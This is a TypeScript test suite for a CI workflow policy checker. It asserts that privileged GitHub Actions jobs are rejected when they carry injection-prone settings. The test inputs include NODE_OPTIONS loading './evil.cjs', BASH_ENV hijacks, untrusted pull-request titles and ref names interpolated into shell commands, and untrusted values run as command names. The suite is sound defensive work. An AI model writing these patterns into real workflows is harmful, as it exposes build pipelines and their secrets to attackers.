test('M2-2 r1 (A): inherited workflow-level execution settings are part of the privileged policy', () => {
  const cases: [string, (w: Record<string, Workflow>) => void, RegExp][] = [
    ['NODE_OPTIONS in workflow env', (w) => (w['visual-publish.yml'].env = { NODE_OPTIONS: '--require ./evil.cjs' }), /visual-publish\.yml › publish: privileged job differs from its reviewed fingerprint/],
    ['NODE_OPTIONS in workflow env (named rule)', (w) => (w['visual-publish.yml'].env = { NODE_OPTIONS: '--require ./evil.cjs' }), /visual-publish\.yml › publish: execution-control variable NODE_OPTIONS is set for a privileged job \(workflow env\)/],
    ['BASH_ENV in workflow env', (w) => (w['image-scout.yml'].env = { BASH_ENV: './x.sh' }), /image-scout\.yml › publish: execution-control variable BASH_ENV is set for a privileged job \(workflow env\)/],
    ['workflow defaults.run.shell', (w) => (w['image-scout.yml'].defaults = { run: { shell: 'python {0}' } }), /image-scout\.yml › publish: privileged job differs from its reviewed fingerprint/],
    ['workflow defaults.run.shell (named rule)', (w) => (w['image-scout.yml'].defaults = { run: { shell: 'python {0}' } }), /image-scout\.yml › publish: privileged job runs with a non-default shell \(python \{0\}, workflow defaults\)/],
    ['workflow defaults.run.working-directory', (w) => (w['visual-publish.yml'].defaults = { run: { 'working-directory': 'untrusted' } }), /visual-publish\.yml › publish: privileged job differs from its reviewed fingerprint/],
    ['job-level NODE_OPTIONS', (w) => (w['visual-publish.yml'].jobs.publish.env = { ...w['visual-publish.yml'].jobs.publish.env, NODE_OPTIONS: '--import x' }), /execution-control variable NODE_OPTIONS is set for a privileged job \(job env\)/],
    ['step shell override', (w) => (steps(w['visual-publish.yml'], 'publish')[1].shell = 'sh -e {0}'), /privileged job runs with a non-default shell \(sh -e \{0\}, step\)/],
    ['new trigger on a privileged workflow', (w) => ((w['deploy.yml'] as Workflow & { on: unknown }).on = { pull_request_target: {} }), /deploy\.yml › deploy: privileged job differs from its reviewed fingerprint/],
  ];
  assertAllRejected(cases);
  // Unprivileged workflows may still use workflow env and defaults freely.
  assert.deepEqual(mutated((w) => ((w['check.yml'].env = { NODE_OPTIONS: '--max-old-space-size=4096' }), (w['check.yml'].defaults = { run: { shell: 'bash' } }))), []);
});

test('M2-2 r1 (B): multiline expressions are found in run scripts and env values', () => {
  const ml = '${{\n  github.event.pull_request.title\n}}';
  const cases: [string, (w: Record<string, Workflow>) => void, RegExp][] = [
    ['multiline expression in run', (w) => addRun(w, 'check.yml', 'check', `echo "${ml}"`), /\$\{\{ github\.event\.pull_request\.title \}\} interpolated into run:/],
    ['multiline expression in a .yaml workflow', (w) => (w['extra.yaml'] = { permissions: { contents: 'read' }, jobs: { j: { steps: [{ run: `git checkout \${{\n github.head_ref }}` }] } } }), /^extra\.yaml › j › step 1: \$\{\{ github\.head_ref \}\} interpolated into run:/],
    ['multiline untrusted env value, unquoted', (w) => addRun(w, 'check.yml', 'check', 'echo $T', { env: { T: ml } }), /untrusted \$T \(from \$\{\{ github\.event\.pull_request\.title \}\}\) expanded without double quotes/],
    ['multiline trusted-looking env that is not exact', (w) => addRun(w, 'check.yml', 'check', 'echo $S', { env: { S: '${{\n github.sha ||\n github.head_ref }}' } }), /untrusted \$S \(from \$\{\{ github\.sha \|\| github\.head_ref \}\}\)/],
    ['expression containing } in a string', (w) => addRun(w, 'check.yml', 'check', "echo ${{ format('{0}', github.head_ref) }}"), /\$\{\{ format\('\{0\}', github\.head_ref\) \}\} interpolated into run:/],
  ];
  assertAllRejected(cases);
  // A multiline trusted expression in env stays trusted (whitespace is normalised).
  assert.deepEqual(mutated((w) => addRun(w, 'check.yml', 'check', 'echo $S', { env: { S: '${{\n  github.sha\n}}' } })), []);
  // Exceptions still match exactly, also when the expression is written over several lines.
  RUN_EXPR_EXCEPTIONS.push({ file: 'check.yml', job: 'check', step: 'injected', expr: 'github.sha', why: 'test-only exception' });
  try {
    assert.deepEqual(mutated((w) => addRun(w, 'check.yml', 'check', 'echo "${{\n  github.sha\n}}"')), []);
    assert.ok(mutated((w) => addRun(w, 'check.yml', 'check', 'echo "${{\n  github.run_id\n}}"')).some((m) => /github\.run_id \}\} interpolated/.test(m)));
  } finally {
    RUN_EXPR_EXCEPTIONS.pop();
  }
});

test('M2-2 r1 (C): untrusted data is never used as a command name, even quoted', () => {
  const cases: [string, string, RegExp][] = [
    ['quoted untrusted variable as the executable', '"$REF_NAME" --help', /untrusted \$REF_NAME \(from \$\{\{ github\.ref_name \}\}\) used as a command name/],
    ['braced and path-prefixed', '"./bin/${REF_NAME}" run', /untrusted \$REF_NAME .* used as a command name/],
    ['through env', 'env FOO=1 "$REF_NAME"', /untrusted \$REF_NAME .* used as a command name \(via env\)/],
    ['through exec', 'exec "$REF_NAME"', /untrusted \$REF_NAME .* used as a command name \(via exec\)/],
    ['through timeout', 'timeout 10 "$REF_NAME" x', /untrusted \$REF_NAME .* used as a command name \(via timeout\)/],
    ['through xargs', 'echo a | xargs -0 "$REF_NAME"', /untrusted \$REF_NAME .* used as a command name \(via xargs\)/],
    ['via command substitution', '"$(printf %s "$REF_NAME")" x', /untrusted \$REF_NAME .* used as a command name/],
    ['inside $(…)', 'echo "$("$REF_NAME")"', /untrusted \$REF_NAME .* used as a command name/],
    ['built-in ref variable', '"$GITHUB_HEAD_REF"', /untrusted \$GITHUB_HEAD_REF \(from a GitHub ref name\) used as a command name/],
  ];
  assertAllRejected(cases.map(([name, run, expected]) => [name, (w: Record<string, Workflow>) => addRun(w, 'visual.yml', 'capture', run), expected]));
  // Quoted untrusted values as arguments, and trusted values as command names, stay accepted.
  for (const ok of ['git log -1 -- "$REF_NAME"', 'printf "%s\\n" "$REF_NAME"', 'env BRANCH="$REF_NAME" node -e "1"', '"$RUNNER_TEMP/tool" --version'])
    assert.deepEqual(mutated((w) => addRun(w, 'visual.yml', 'capture', ok)), [], ok);
});

test('exceptions to the no-interpolation rule are exact', () => {
  const w = clone(real());
  addRun(w, 'check.yml', 'check', 'echo "${{ github.sha }}" "${{ github.run_id }}"');
  RUN_EXPR_EXCEPTIONS.push({ file: 'check.yml', job: 'check', step: 'injected', expr: 'github.sha', why: 'test-only exception' });
  try {
    const v = violations(w);
    assert.ok(!v.some((m) => /github\.sha \}\} interpolated/.test(m)), 'the exact exception applies');
    assert.ok(v.some((m) => /github\.run_id \}\} interpolated/.test(m)), 'a different expression in the same step is still rejected');
    const elsewhere = clone(real());
    addRun(elsewhere, 'visual.yml', 'capture', 'echo "${{ github.sha }}"');
    assert.ok(violations(elsewhere).some((m) => /visual\.yml .* github\.sha \}\} interpolated/.test(m)), 'the same expression in another step is still rejected');
  } finally {
    RUN_EXPR_EXCEPTIONS.pop();
  }
  assert.deepEqual(RUN_EXPR_EXCEPTIONS, [], 'no exceptions are needed by the current workflows');
});

test('both workflow file extensions are discovered', () => {
  assert.ok(isWorkflowFile('a.yml') && isWorkflowFile('b.yaml'));
  assert.ok(!isWorkflowFile('c.yml.bak') && !isWorkflowFile('README.md') && !isWorkflowFile('d.json'));
});

test('shell reader: finds commands through quotes, substitutions, wrappers and case/loops', () => {
  const names = (s: string) => commands(s).commands.map((c) => c.argv[0].value);
  assert.deepEqual(names('A=1 B="x y" git push "$R" HEAD 2>/dev/null >> out.log'), ['git']);
  assert.deepEqual(names('x=$(printf "%s" "$a" | base64 -w0)'), ['printf', 'base64']);
  assert.deepEqual(names('echo "n=$(wc -l < "$f")" `date`'), ['wc', 'date', 'echo']);
  assert.deepEqual(names("sh -c 'npm ci && \"npx\" tsx x'"), ['sh', 'npm', 'npx']);
  assert.deepEqual(names('timeout 5 env -i X=1 nice -n 2 xargs -0 rm'), ['timeout', 'env', 'nice', 'xargs', 'rm']);
  assert.deepEqual(names('case "$t" in\n  l) fail "x" ;;\n  *.json) node -e "1" ;;\nesac'), ['fail', 'node']);
  assert.deepEqual(names('for p in "${files[@]}"; do install -m 0644 -- "$p" out/; done'), ['install']);
  assert.deepEqual(names('while IFS= read -r -d \'\' r; do :; done < "$list"'), ['read', ':']);
  assert.deepEqual(names('n=$(( a + b )); if [ "$n" -gt 1 ]; then echo big; fi # npm in a comment'), ['[', 'echo']);
  const f = commands('fail() { echo "::error::$1"; exit 1; }\nfiles=()\nfail x');
  assert.deepEqual(f.functions, ['fail']);
  assert.deepEqual(f.commands.map((c) => c.argv[0].value), ['echo', 'exit', 'fail']);
  assert.deepEqual(commands('cat <<EOF\nx\nEOF').problems, ['heredoc (not analysed)']);
  const ex = expansions(`echo $A "$B" '$C' "$(echo $D)" \${E%x} "\${F}" $'$G' # $H`);
  assert.deepEqual(ex.map((e) => `${e.name}:${e.quoted ? 'q' : 'u'}${e.inSubstitution ? 's' : ''}`), ['A:u', 'B:q', 'D:us', 'E:u', 'F:q']);
});

test('realistic regression: the pre-M1 image-scout workflow (still on the image-scout branch) is rejected', () => {
  const old = yaml.load(readFileSync(new URL('./fixtures/workflows/image-scout-cb6b8fe.yml', import.meta.url), 'utf8')) as Workflow;
  const v = violations({ 'image-scout.yml': old });
  const expected = [
    /^image-scout\.yml: workflow-level token has write scopes \(contents\)/,
    /^image-scout\.yml › scout: unexpected write scopes \(contents\)/,
    /^image-scout\.yml › scout › step 1: checkout must set persist-credentials: false/,
    /^image-scout\.yml › scout › step 2: privileged job sets up Node packages/,
    /^image-scout\.yml › scout › step 3: privileged job runs package code \(npm\)/,
    /^image-scout\.yml › scout › step 4: privileged job runs package code \(npx\)/,
    /token or secret interpolated into run:/,
  ];
  for (const e of expected) assert.ok(v.some((m) => e.test(m)), `expected ${e}, got ${JSON.stringify(v, null, 1)}`);
});

test('npm install-script policy: strict mode on, every package with an install script reviewed', () => {
  const npmrc = readFileSync(new URL('../.npmrc', import.meta.url), 'utf8');
  assert.match(npmrc, /^strict-allow-scripts=true$/m);
  assert.ok(!/dangerously-allow-all-scripts|^ignore-scripts=false/m.test(npmrc));
  const pkg = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8'));
  const lock = JSON.parse(readFileSync(new URL('../package-lock.json', import.meta.url), 'utf8'));
  const policy = pkg.allowScripts as Record<string, boolean>;
  const withScripts = [...new Set(Object.entries(lock.packages as Record<string, { hasInstallScript?: boolean }>).filter(([, v]) => v.hasInstallScript).map(([k]) => k.split('node_modules/').pop()!))].sort();
  assert.deepEqual(withScripts, ['esbuild', 'fsevents', 'sharp'], 'packages with install scripts (review any change)');
  // Each is covered; none is approved: their prebuilt platform binaries work without the scripts
  // (proved in CI by the build, the screenshot harness and tests/native-deps.test.ts).
  assert.deepEqual(policy, { esbuild: false, fsevents: false, sharp: false });
});
